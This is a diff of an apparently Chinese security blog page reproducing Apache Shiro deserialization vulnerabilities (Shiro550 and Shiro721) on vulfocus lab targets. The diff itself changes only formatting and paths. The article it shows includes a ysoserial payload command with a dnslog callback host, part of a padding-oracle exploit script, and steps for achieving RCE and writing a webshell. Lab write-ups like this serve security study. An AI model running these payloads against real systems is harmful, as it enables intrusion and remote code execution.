@@ -7,9 +7,9 @@
     <meta name="keywords" content="Shiro550/Shiro721复现, 远离尘世的幻想乡">
     <meta name="description" content="Shiro550原理
 CVE-2016-4437
-影响版本：Shiro &amp;lt;= 1.2.4
+影响版本：Shiro &amp;lt;&amp;#x3D; 1.2.4
 
-Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对reme">
+Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -45,7 +45,7 @@ Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录�
 
     <script src="./libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
 </head>
 
 
@@ -567,7 +567,7 @@ Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录�
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    587
+                    592
                 </div>
                 
 
@@ -594,29 +594,29 @@ Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录�
             <div id="articleContent">
                 <h2 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
 <p>CVE-2016-4437</p>
-<p>影响版本：Shiro &lt;= 1.2.4</p>
+<p>影响版本：Shiro &lt;&#x3D; 1.2.4</p>
 </blockquote>
-<p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。<br>那么，Payload产生的过程：<br>命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;伪造RememberMe Cookie值</p>
+<p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。<br>那么，Payload产生的过程：<br>命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;伪造RememberMe Cookie值</p>
 <h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>靶场：<code>vulfocus/shiro-CVE-2016-4437</code></p>
 <p>存在remebmber me</p>
-<p><img src="./../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306145857856.png"></p>
+<p><img src="../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306145857856.png"></p>
 <p>burpsuite的插件扫出来key</p>
-<p><img src="./../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306135131021.png"></p>
+<p><img src="../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306135131021.png"></p>
 <p>掏出<a target="_blank" rel="noopener" href="https://github.com/SummerSec/ShiroAttack2">ShiroAttack2</a>，用jre8打开</p>
 <p>先检测，有密钥填密钥，没密钥可以尝试爆破</p>
-<p><img src="./../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141050056.png"></p>
+<p><img src="../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141050056.png"></p>
 <p>然后检测利用链</p>
-<p><img src="./../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141113600.png"></p>
+<p><img src="../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141113600.png"></p>
 <p>也可以尝试爆破一下</p>
-<p><img src="./../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141148186.png"></p>
+<p><img src="../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141148186.png"></p>
 <p>成功rce</p>
-<p><img src="./../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141226207.png"></p>
+<p><img src="../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141226207.png"></p>
 <p>也可以生成个key后续使用</p>
-<p><img src="./../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141253090.png"></p>
-<p><img src="./../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141321691.png"></p>
+<p><img src="../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141253090.png"></p>
+<p><img src="../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141321691.png"></p>
 <p>写入个马</p>
-<p><img src="./../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141436577.png"></p>
-<p><img src="./../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141459480.png"></p>
+<p><img src="../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141436577.png"></p>
+<p><img src="../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306141459480.png"></p>
 <h2 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h2><blockquote>
 <p>CVE-2019-12422</p>
 <p>影响版本：Shiro &lt; 1.4.2</p>
@@ -625,9 +625,9 @@ Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录�
 <p>涉及到Padding Oracle Attack的题<a href="https://syunaht.com/p/2598013568.html#toc-heading-3">刷题笔记:[NPUCTF2020]web狗</a></p>
 <h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>靶机：<code>vulfocus/shiro-721</code></p>
 <p>登录，然后取出cookie</p>
-<p><img src="./../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306151413738.png"></p>
+<p><img src="../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306151413738.png"></p>
 <h4 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h4><p>先用<code>ysoserial</code>生成class</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -jar ysoserial.jar CommonsCollections1 <span class="token string">"ping 4997u3.dnslog.cn"</span> <span class="token operator">></span> payload.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -jar ysoserial.jar CommonsCollections1 <span class="token string">"ping 4997u3.dnslog.cn"</span> <span class="token operator">></span> payload.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后再用exp跑</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#https://github.com/3ndz/Shiro-721</span>
@@ -684,14 +684,14 @@ Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录�
     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'rememberMe cookies:'</span><span class="token punctuation">)</span>
     <span class="token keyword">print</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python shiro_exp.py http://192.168.110.131:41906/account <span class="token punctuation">[</span>rememberMeCookie<span class="token punctuation">]</span> payload.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python shiro_exp.py http://192.168.110.131:41906/account <span class="token punctuation">[</span>rememberMeCookie<span class="token punctuation">]</span> payload.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>地址为登录后的界面</p>
-<p><img src="./../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306152320554.png"></p>
+<p><img src="../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306152320554.png"></p>
 <h4 id="ShiroExploit"><a href="#ShiroExploit" class="headerlink" title="ShiroExploit"></a>ShiroExploit</h4><p>掏出<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit-Deprecated">ShiroExploit</a></p>
-<p><img src="./../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306151533661.png"></p>
+<p><img src="../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306151533661.png"></p>
 <p>然后慢慢跑就是了</p>
-<p><img src="./../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306151608315.png"></p>
+<p><img src="../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306151608315.png"></p>
 <p>估计得跑三四个小时，很难在实际环境中有效利用。</p>
 
                 
